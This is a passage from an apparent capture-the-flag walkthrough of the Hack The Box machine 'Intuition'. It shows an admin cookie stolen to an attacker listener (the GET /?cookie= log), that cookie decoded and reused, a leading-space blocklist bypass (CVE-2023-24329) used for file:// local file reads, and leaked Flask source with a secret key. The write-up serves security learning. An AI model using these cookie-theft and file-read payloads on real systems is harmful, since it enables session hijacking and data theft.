+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;10.129.30.32 - - [06/Sep/2024 08:51:34] &quot;GET /?cookie=dXNlcl9kYXRhPWV5SjFjMlZ5WDJsa0lqb2dNU3dnSW5WelpYSnVZVzFsSWpvZ0ltRmtiV2x1SWl3Z0luSnZiR1VpT2lBaVlXUnRhVzRpZlh3ek5EZ3lNak16TTJRME5EUmhaVEJsTkRBeU1tWTJZMk0yTnpsaFl6bGtNalprTVdReFpEWTRNbU0xT1dNMk1XTm1ZbVZoTWpsa056YzJaRFU0T1dRNQ== HTTP/1.1&quot; 200 -
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;In the screenshot you will receive the cookie for &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;webdev&lt;/code&gt; again because we have the server waiting, but once you change to high priority you should get the second response with the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin cookie&lt;/code&gt;.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/box-images/Intuition/Intuition_Admin_Cookie_Theft_Cookie.png&quot; /&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Doing the same thing as before, decrypt and store the cookies into the browser.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;echo &apos;dXNlcl9kYXRhPWV5SjFjMlZ5WDJsa0lqb2dNU3dnSW5WelpYSnVZVzFsSWpvZ0ltRmtiV2x1SWl3Z0luSnZiR1VpT2lBaVlXUnRhVzRpZlh3ek5EZ3lNak16TTJRME5EUmhaVEJsTkRBeU1tWTJZMk0yTnpsaFl6bGtNalprTVdReFpEWTRNbU0xT1dNMk1XTm1ZbVZoTWpsa056YzJaRFU0T1dRNQ==&apos; | base64 -d
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;i class=&quot;fa-solid fa-cookie-bite fa-lg&quot; style=&quot;color: #fabd2f;&quot;&gt;&lt;/i&gt; Admin Cookie: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;user_data=eyJ1c2VyX2lkIjogMSwgInVzZXJuYW1lIjogImFkbWluIiwgInJvbGUiOiAiYWRtaW4ifXwzNDgyMjMzM2Q0NDRhZTBlNDAyMmY2Y2M2NzlhYzlkMjZkMWQxZDY4MmM1OWM2MWNmYmVhMjlkNzc2ZDU4OWQ5&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/box-images/Intuition/Intuition_Admin_Dashboard.png&quot; /&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;-recon&quot;&gt;&lt;i class=&quot;fa-solid fa-feather-pointed&quot; style=&quot;color: #aec07c;&quot;&gt;&lt;/i&gt; Recon:&lt;/h1&gt;
+&lt;h3 id=&quot;-pdf-generator&quot;&gt;&lt;i class=&quot;fa-solid fa-file-pdf fa-xs&quot; style=&quot;color: #fb4934;&quot;&gt;&lt;/i&gt; PDF Generator:&lt;/h3&gt;
+&lt;p&gt;Once in the admin dashboard you have a link to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Create PDF Report&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/box-images/Intuition/Intuition_Admin_Create_PDF_Report.png&quot; /&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;You can &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Make a PDF Report&lt;/code&gt;. Lets just see what gets sent to a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;NC Listener&lt;/code&gt; and if anything responds.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/box-images/Intuition/Intuition_Create_PDF_URL_NC.png&quot; /&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;We get an &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;unexpected error!&lt;/code&gt; On the PDF report..BUT! On our &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;NC listener&lt;/code&gt; we get some interesting information.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;listening on [any] 34000 ...
+connect to [10.10.14.200] from (UNKNOWN) [10.129.30.32] 41434
+GET / HTTP/1.1
+Accept-Encoding: identity
+Host: 10.10.14.200:34000
+User-Agent: Python-urllib/3.11
+Cookie: user_data=eyJ1c2VyX2lkIjogMSwgInVzZXJuYW1lIjogImFkbWluIiwgInJvbGUiOiAiYWRtaW4ifXwzNDgyMjMzM2Q0NDRhZTBlNDAyMmY2Y2M2NzlhYzlkMjZkMWQxZDY4MmM1OWM2MWNmYmVhMjlkNzc2ZDU4OWQ5
+Connection: close
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/box-images/Intuition/Intuition_NC_PDF_Hit.png&quot; /&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;We see the agent is using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Python-urlib/3.11&lt;/code&gt;. We can use this to look for vulnerabilities and CVE’s related to this tool.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;-cve-2023-24329&quot;&gt;&lt;i class=&quot;fa-solid fa-user-secret&quot; style=&quot;color: #fb4934&quot;&gt;&lt;/i&gt; CVE-2023-24329:&lt;/h2&gt;
+&lt;ul&gt;
+  &lt;li&gt;We find a CVE Related to this version of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;urlib 3.11&lt;/code&gt;.&lt;br /&gt;
+  &lt;i class=&quot;fa-solid fa-frog&quot; style=&quot;color: #b8bb26;&quot;&gt;&lt;/i&gt; &lt;a href=&quot;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-24329&quot;&gt;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-24329&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;The CVE essentially works by allowing users to bypass blocklists with simply  injecting a blank space before the url in our request. This can allow use to perform different types of attacks like LFI, SSRF and even command execution because we are bypassing any filters put into place on the domain.&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Capture a request from the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Create PDF&lt;/code&gt; tool we just used to get the previous information.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/box-images/Intuition/Intuition_Create_PDF_Request.png&quot; /&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Next lets change the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;report_Url=PAYLOAD&lt;/code&gt; input to try some simple &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;LFI&lt;/code&gt;.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/box-images/Intuition/Intuition_PDF_LFI.png&quot; /&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Open the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;response&lt;/code&gt; in your browser, if using burp just right click and “Open in browser”, and we will see the PDF was generated with the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;LFI&lt;/code&gt; included.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/box-images/Intuition/Intution_PDF_LFI_Proof.png&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;-python-app&quot;&gt;&lt;i class=&quot;fa-brands fa-python&quot; style=&quot;color: #98971a;&quot;&gt;&lt;/i&gt; Python App:&lt;/h2&gt;
+&lt;ul&gt;
+  &lt;li&gt;We know the system is running python more than likely this is a flask app lets see if we can check a generic flask app location and get any information.&lt;br /&gt;
+  &lt;i class=&quot;fa-solid fa-frog&quot; style=&quot;color: #b8bb26;&quot;&gt;&lt;/i&gt; change your &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;LFI&lt;/code&gt; to &lt;mark&gt; ` file:///app/code/app.py`&lt;/mark&gt;. Don’t forget the empty space before &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;file&lt;/code&gt;. That’s the whole exploit.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/box-images/Intuition/Intuition_Python_App_LFI.png&quot; /&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;We find a stored &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;secret key&lt;/code&gt; inside the code of the app.&lt;br /&gt;
+  &lt;i class=&quot;fa-solid fa-seedling fa-lg&quot; style=&quot;color: #98971a&quot;&gt;&lt;/i&gt;  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;app.secret_key = &quot;7ASS7ADA8RF3FD7&quot;&lt;/code&gt; but im not sure its useful at the moment.&lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;We can also see all the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IMPORTS&lt;/code&gt; the app is making. We can go check these out and see if we can find anymore information thats being pulled into the app via other imports.&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Running the code through &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;chatgpt&lt;/code&gt; to make it more human readable we get:&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;flask&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Flask&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;redirect&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;blueprints.index.index&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;main_bp&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;blueprints.report.report&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;report_bp&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;blueprints.auth.auth&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;auth_bp&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;blueprints.dashboard.dashboard&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dashboard_bp&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;app&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Flask&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__name__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;c1&quot;&gt;# Set the secret key for session management
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;app&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;secret_key&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;7ASS7ADA8RF3FD7&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;
+
+&lt;span class=&quot;c1&quot;&gt;# Configure server settings
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;app&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;config&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;SERVER_NAME&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;comprezzor.htb&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;app&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;config&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;MAX_CONTENT_LENGTH&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1024&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1024&lt;/span&gt;  &lt;span class=&quot;c1&quot;&gt;# Limit file size to 5MB
+&lt;/span&gt;
+&lt;span class=&quot;c1&quot;&gt;# Define allowed file extensions
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ALLOWED_EXTENSIONS&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;txt&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;pdf&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;docx&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;  &lt;span class=&quot;c1&quot;&gt;# Add more allowed file extensions if needed
+&lt;/span&gt;
+&lt;span class=&quot;c1&quot;&gt;# Register blueprints for different parts of the application
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;app&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;register_blueprint&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;main_bp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;app&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;register_blueprint&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;report_bp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;subdomain&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;report&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;app&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;register_blueprint&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;auth_bp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;subdomain&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;auth&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;app&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;register_blueprint&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dashboard_bp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;subdomain&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;dashboard&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__name__&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;__main__&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;app&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;run&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;debug&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;False&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;host&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;0.0.0.0&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;80&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;We can explore these &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Imports&lt;/code&gt; with our &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;LFI&lt;/code&gt;.&lt;br /&gt;
+   &lt;i class=&quot;fa-solid fa-frog&quot; style=&quot;color: #b8bb26;&quot;&gt;&lt;/i&gt; &lt;mark&gt;` file:///app/code/blueprints/report/report.py`&lt;/mark&gt;&lt;br /&gt;
+    &lt;ul&gt;
+      &lt;li&gt;Since its python we are assuming its a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.py&lt;/code&gt; script at the end of the import.&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/box-images/Intuition/Intuition_Report_PY_LFI.png&quot; /&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;We find the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;report.py&lt;/code&gt; script. Running it through &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;chatgpt&lt;/code&gt; again for readability.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;flask&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Blueprint&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;render_template&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;flash&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;url_for&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;redirect&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;.report_utils&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;blueprints.auth.auth_utils&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;deserialize_user_data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;admin_required&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;login_required&lt;/span&gt;
+
+&lt;span class=&quot;c1&quot;&gt;# Define the Blueprint for the report routes
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;report_bp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Blueprint&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;report&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__name__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;subdomain&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;report&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;c1&quot;&gt;# Route for the report index page
+&lt;/span&gt;&lt;span class=&quot;nd&quot;&gt;@report_bp.route&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;methods&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;GET&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;report_index&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;render_template&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;report/index.html&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;c1&quot;&gt;# Route for reporting a bug
+&lt;/span&gt;&lt;span class=&quot;nd&quot;&gt;@report_bp.route&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;/report_bug&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;methods&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;GET&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;POST&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
+&lt;span class=&quot;nd&quot;&gt;@login_required&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;report_bug&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;method&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;POST&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;user_data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cookies&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;user_data&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;user_info&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;deserialize_user_data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;user_data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
